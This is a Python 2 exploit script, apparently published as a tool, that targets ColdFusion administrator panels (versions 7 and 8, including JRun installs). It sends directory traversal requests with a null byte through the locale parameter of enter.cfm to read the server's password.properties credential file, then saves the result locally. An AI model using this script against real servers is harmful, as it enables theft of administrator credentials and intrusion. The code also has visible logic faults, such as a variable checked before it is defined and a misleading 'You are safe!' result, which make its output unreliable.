import urllib2
print "[+] CFIDE Directory Traversal Scanner by Shubham Shah"
print "[+] Example URL: 'http://example.com"
method = raw_input("[+] Enter 1 for default or 2 for JRUN: ")
if method == "1":
    u = raw_input("URL: ")
    f = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm").read()
    if "password=" not in f:
        print "[+] Unexploitable, You are safe!"
    elif "password=" not in f2:
        print "[+] Unexploitable, You are safe!"
    elif '7</strong><br />' in (f):
        print "[+] CFIDE Panel Version 7"
        f1 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en").read()
        if "password=" in f1:
            print "[+] Payload Injected, Exploit Working"
            save = raw_input("[+] Would you like to save this file? Y or N: ")
            if save == "Y":
                        savetxt = raw_input("[+] What would you like to name the txt file? E.G. 'test.txt': ")
                        k = open(savetxt,"w")
                        k.write(f1)
                        k.close()
                        print "[+] Operation Completed.", savetxt, "saved."
    elif '/CFIDE/administrator/images/spacer.gif' in (f):
                            print "[+] CFIDE Panel Version 8"
                            f2 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en").read()
                            if "password=" in f2:
                                print "[+] Payload Injected, Exploit Working"
                                save = raw_input("[+] Would you like to save this file? Y or N: ")
                                if save == "Y":
                                    savetxt1 = raw_input("[+] What would you like to name the txt file? E.G. 'test.txt': ")
                                    k = open(savetxt1,"w")
                                    k.write(f2)
                                    k.close()
                                    print "[+] Operation Completed.", savetxt1, "saved."
elif method == "2":
    u = raw_input("URL: ")
    f = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm").read()
    if "password=" not in f:
        print "[+] Unexploitable, You are safe!"
    elif "password=" not in f2:
        print "[+] Unexploitable, You are safe!"
    elif '7</strong><br />' in (f):
        print "[+] CFIDE Panel Version 7"
        f1 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en").read()
        if "password=" in f1:
            print "[+] Payload Injected, Exploit Working"
            save = raw_input("[+] Would you like to save this file? Y or N: ")
            if save == "Y":
                        savetxt = raw_input("[+] What would you like to name the txt file? E.G. 'test.txt': ")
                        k = open(savetxt,"w")
                        k.write(f1)
                        k.close()
                        print "[+] Operation Completed.", savetxt, "saved."
    elif '/CFIDE/administrator/images/spacer.gif' in (f):
                            print "[+] CFIDE Panel Version 8"
                            f2 = urllib2.urlopen(u + "/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en").read()
                            if "password=" in f2:
                                print "[+] Payload Injected, Exploit Working"
                                save = raw_input("[+] Would you like to save this file? Y or N: ")
                                if save == "Y":
                                    savetxt1 = raw_input("[+] What would you like to name the txt file? E.G. 'test.txt': ")
                                    k = open(savetxt1,"w")
                                    k.write(f2)
                                    k.close()
                                    print "[+] Operation Completed.", savetxt1, "saved."    
